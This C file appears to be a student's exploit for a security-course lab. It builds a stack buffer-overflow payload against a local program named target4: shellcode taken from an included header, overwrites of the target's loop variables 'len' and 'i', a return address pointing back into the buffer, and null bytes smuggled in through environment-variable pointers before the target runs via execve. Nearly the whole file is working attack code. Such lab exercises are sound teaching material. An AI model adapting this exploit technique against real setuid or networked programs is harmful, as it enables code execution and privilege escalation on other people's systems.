#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

//my own constants
#define BUFSIZE 189
#define TARGET_RA_ADDR 0x202dfdb0	//bufs starting point which is shell code where shell code will be placed
#define SHELL_LENGTH 45

#define OVERWRITE_LEN 0x000000BB	// 187: this value overwritten in len's place
#define OVERWRITE_I 0x000000AC	//	172: this value overwritten in i's place

int main(void)
{
	char *args[3];
	char *env[6];

	//printf("Startingzz4 sploit4.c:\n");	//for debugging

	//Making the attack buffer
	char attack_buffer[189];
	int i;

	//First fill all of attack buffer with a random number to prevent random nulls
	for(i = 0; i < BUFSIZE; i++)
	{
		attack_buffer[i] = 0x04;
	}

	//Fill first 45 bytes of attack buffer with shell code
	for(i = 0; i<SHELL_LENGTH;i++) //copying 45 bytes from index 0, because 46th byte is a NULL character
	{
		attack_buffer[i] = shellcode[i];
	}

	//Fill portion after shellcode and before len with random value just to help debug
	for(i = 45 ; i < 168; i++)
	{
		attack_buffer[i] = 0x05;
	}

	//Put in value of 187 in attack_buffer[168] which is the variable len. This because we want to loop 187 times to reach the end of return address
	int *a = (int *) &attack_buffer[168];
	*a = OVERWRITE_LEN;

	//put in value of 172 in attack_buffer[172] which is the variable i. This is because we reach the first byte of i in the 172nd byte
	int *b = (int *) &attack_buffer[172];
	*b = OVERWRITE_I;

	//Indexes 184 to 187 of attack buffer has the return address and so we point it to the start of buffer
	int *c = (int *) &attack_buffer[184];
	*c = TARGET_RA_ADDR;

	//Put a null character at end of attack_buffer which is at index 187.
	attack_buffer[BUFSIZE - 1] = '\0';

	args[0] = TARGET; 
	args[1] = attack_buffer;
	args[2] = NULL;
	
	//need to pass in 0s so use env to do it. Each env will copy till a 0 received. So use 6 to copy full buffer with 0s in certain places. 
	//env vars placed just after attack buffer in argv
	env[0] = &attack_buffer[170];
	env[1] = &attack_buffer[171];
	env[2] = &attack_buffer[172];
	env[3] = &attack_buffer[174];
	env[4] = &attack_buffer[175];
	env[5] = &attack_buffer[176];


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
